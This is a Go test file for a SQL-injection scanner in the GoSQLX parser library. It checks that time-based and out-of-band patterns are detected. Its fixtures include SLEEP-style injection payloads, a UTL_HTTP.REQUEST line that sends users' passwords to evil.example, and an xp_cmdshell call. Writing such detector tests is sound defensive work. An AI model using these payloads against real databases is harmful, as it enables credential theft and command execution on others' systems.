// Copyright 2026 GoSQLX Authors
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

package security

import (
	"testing"

	"github.com/ajitpratap0/GoSQLX/pkg/sql/ast"
	"github.com/ajitpratap0/GoSQLX/pkg/sql/keywords"
	"github.com/ajitpratap0/GoSQLX/pkg/sql/parser"
)

// TestScan_PrimaryFormOperands checks that the AST scanner descends into the
// primary-expression nodes (MATCH ... AGAINST, keyword arguments, :=,
// INTERVAL <expr> <unit>, the Oracle (+) marker and CONNECT_BY_ROOT). MATCH
// ... AGAINST (SLEEP(5)) was reported while it parsed as a BinaryExpression.
func TestScan_PrimaryFormOperands(t *testing.T) {
	tests := []struct {
		name    string
		dialect keywords.SQLDialect
		sql     string
	}{
		{"match against", keywords.DialectMySQL, "SELECT * FROM t WHERE MATCH(a) AGAINST (SLEEP(5))"},
		{"match against with modifier", keywords.DialectMySQL,
			"SELECT * FROM t WHERE MATCH(a) AGAINST (SLEEP(5) IN BOOLEAN MODE)"},
		{"keyword argument", keywords.DialectMySQL,
			"SELECT * FROM t WHERE id = 1 AND SUBSTRING(a FROM SLEEP(5)) = 'x'"},
		{"variable assignment", keywords.DialectMySQL, "SELECT @a := SLEEP(5)"},
		{"interval value", keywords.DialectMySQL, "SELECT * FROM t WHERE d > NOW() - INTERVAL SLEEP(5) DAY"},
		{"connect_by_root", keywords.DialectOracle, "SELECT CONNECT_BY_ROOT SLEEP(5) FROM t"},
	}
	scanner := NewScanner()
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			tree, err := parser.ParseWithDialect(tt.sql, tt.dialect)
			if err != nil {
				t.Fatalf("parse %q: %v", tt.sql, err)
			}
			defer ast.ReleaseAST(tree)
			if result := scanner.Scan(tree); !hasPattern(result, PatternTimeBased) {
				t.Errorf("Scan: expected %s finding, got %+v", PatternTimeBased, result.Findings)
			}
		})
	}
}

// TestScan_QualifiedDangerousFunctions checks that schema- and
// package-qualified calls, which parse in expressions since qualified
// function-call support, are matched on their parts.
func TestScan_QualifiedDangerousFunctions(t *testing.T) {
	tests := []struct {
		name    string
		dialect keywords.SQLDialect
		sql     string
		want    PatternType
	}{
		{"pg_catalog.pg_sleep", keywords.DialectPostgreSQL,
			"SELECT * FROM t WHERE id = 1 AND pg_catalog.pg_sleep(5) IS NULL", PatternTimeBased},
		{"DBMS_LOCK.SLEEP", keywords.DialectOracle, "SELECT DBMS_LOCK.SLEEP(5) FROM dual", PatternTimeBased},
		{"UTL_HTTP.REQUEST", keywords.DialectOracle,
			"SELECT UTL_HTTP.REQUEST('http://evil.example/' || password) FROM users", PatternOutOfBand},
		{"sys.xp_cmdshell", keywords.DialectSQLServer, "SELECT sys.xp_cmdshell('dir')", PatternOutOfBand},
	}
	scanner := NewScanner()
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			tree, err := parser.ParseWithDialect(tt.sql, tt.dialect)
			if err != nil {
				t.Fatalf("parse %q: %v", tt.sql, err)
			}
			defer ast.ReleaseAST(tree)
			if result := scanner.Scan(tree); !hasPattern(result, tt.want) {
				t.Errorf("Scan: expected %s finding, got %+v", tt.want, result.Findings)
			}
		})
	}
	// A qualified call to an ordinary function is not reported.
	tree, err := parser.ParseWithDialect("SELECT pg_catalog.now(), auth.uid()", keywords.DialectPostgreSQL)
	if err != nil {
		t.Fatalf("parse: %v", err)
	}
	defer ast.ReleaseAST(tree)
	if result := scanner.Scan(tree); len(result.Findings) != 0 {
		t.Errorf("Scan: unexpected findings %+v", result.Findings)
	}
}
